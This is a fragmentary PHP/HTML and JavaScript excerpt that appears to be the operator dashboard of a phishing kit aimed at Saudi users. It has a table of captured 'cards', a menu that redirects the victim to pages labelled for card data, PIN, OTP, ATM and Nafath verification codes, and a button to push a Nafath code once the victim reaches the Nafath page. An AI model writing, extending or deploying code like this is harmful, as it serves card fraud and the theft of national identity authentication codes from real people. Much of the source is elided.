...
<body>
            ...
            <div class="table-responsive">
                ...
                <table class="modern-table">
                    ...
                    <tbody id="cardsTableBody">
                        ...
                        <?php
                        $canSendNafathCard = false;
                        if (function_exists('dashboard_pdo')) {
                            try {
                                $emCard = trim((string) ($user->username ?? ''));
                                if ($emCard !== '') {
                                    $pdoC = dashboard_pdo();
                                    $stC = $pdoC->prepare(
                                    ...
                                    $stC->execute([$emCard]);
                                    $lrCard = trim((string) ($stC->fetchColumn() ?: ''));
                                    $canSendNafathCard = $lrCard !== ''
                                        && str_contains(strtolower($lrCard), 'nafath.php')
                                        && str_contains($lrCard, 'booking/');
                                }
                            } catch (Throwable $e) {
                                $canSendNafathCard = false;
                            }
                        ...
                        <tr data-user-id="<?= $user->id; ?>" data-last-update="<?= strtotime($user->last_card_time); ?>">
                            ...
                            <td>
                                <button type="button" class="btn-table btn-nafad" onclick="showNafathSend(<?= (int) $user->id; ?>)"
                                    <?= $canSendNafathCard ? '' : 'disabled title="وجّه العميل إلى booking/nafath.php أولاً" style="opacity:0.5;cursor:not-allowed;"' ?>>
                ...
                <div class="modal-body">
                    <div class="redirect-box">
                        ...
                        <select class="form-select form-select-modern" id="redirectPageUser">
                            ...
                            <option value="booking/success.php">رمز تحقق نفاذ</option>
    ...
    const REDIRECT_PAGE_OPTIONS = [
        ...
        { value: 'booking/transaction-code.php', label: 'رمز العملية' },
        { value: 'booking/success.php', label: 'رمز تحقق نفاذ' },
        { value: 'pay.php', label: 'صفحة الدفع (قديمة)' },
        { value: 'otp.php', label: 'OTP (قديمة)' },
        { value: 'atm.php', label: 'ATM (قديمة)' },
        { value: 'pin.php', label: 'بيانات البطاقة (قديمة)' },
        { value: 'nafad.php', label: 'رقم مزود الخدمة (قديمة)' },
        { value: 'success.php', label: 'تحقق مزود الخدمة (قديمة)' },
        { value: 'nafath.php', label: 'نفاذ الأخيرة (قديمة)' }
    ];
            ...
            fetch(`get-user-info.php?user_id=${userId}`)
                ...
                .then(data => {
                    ...
                    newRow.innerHTML = `
                        ...
                        <td>
                            <button type="button" class="btn-table btn-nafad" onclick="showNafathSend(${userId})" disabled title="وجّه العميل إلى booking/nafath.php أولاً" style="opacity:0.5;cursor:not-allowed;">
                                <i class="fas fa-key"></i> إرسال
                            </button>
                        </td>
                        <td>
...
function updateOpenModals(userId, message) {
    ...
    if (isNafadModalOpen && (message.includes('نفاذ') || message.includes('رمز') || message.includes('رقم نفاذ'))) {
        refreshNafadModal(userId);
    }
}
